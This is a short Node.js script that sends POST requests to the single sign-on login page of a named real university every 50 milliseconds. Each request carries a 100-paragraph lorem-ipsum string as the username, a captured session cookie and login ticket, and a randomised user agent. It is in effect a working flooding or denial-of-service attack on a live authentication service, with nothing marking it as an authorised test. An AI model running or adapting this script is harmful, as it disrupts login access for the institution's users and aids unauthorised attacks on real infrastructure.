const qs = require('qs');
const axios = require('axios');
const { LoremIpsum } = require('lorem-ipsum');
const randomUseragent = require('random-useragent');
const a = randomUseragent.getRandom(); // gets a random user agent string
const lorem = new LoremIpsum({

    sentencesPerParagraph: {
        max: 8,
        min: 4
    },
    wordsPerSentence: {
        max: 16,
        min: 4
    }
});

  
let config = (userName) => ({
    method: 'post',
    maxBodyLength: Infinity,
    url: 'https://sso.um.edu.my/cas/login;jsessionid=6C9DDCD440FD82C420305B85C3A78C61',
    headers: {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-GB,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'JSESSIONID=6C9DDCD440FD82C420305B85C3A78C61',
        'Origin': 'https://sso.um.edu.my',
        'Referer': 'https://sso.um.edu.my/cas/login',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': randomUseragent.getRandom(),
    },
    data: qs.stringify({
        'uname': userName,
        'domain': 'um.edu.my',
        'password': 'QATEST',
        'lt': '_c6F771141-3E63-AF43-9B65-3BD52E3A839A_kC9629405-7C26-D1FB-3103-91AF34822339',
        '_eventId': 'submit',
        'username': 'QATEST@um.edu.my'
    })
})

setInterval(() => {

    axios.request(config(lorem.generateParagraphs(100)))
        .then((response) => {
            console.count(response.status);
        })
        .catch((error) => {
            console.log(error);
        });

}, 50);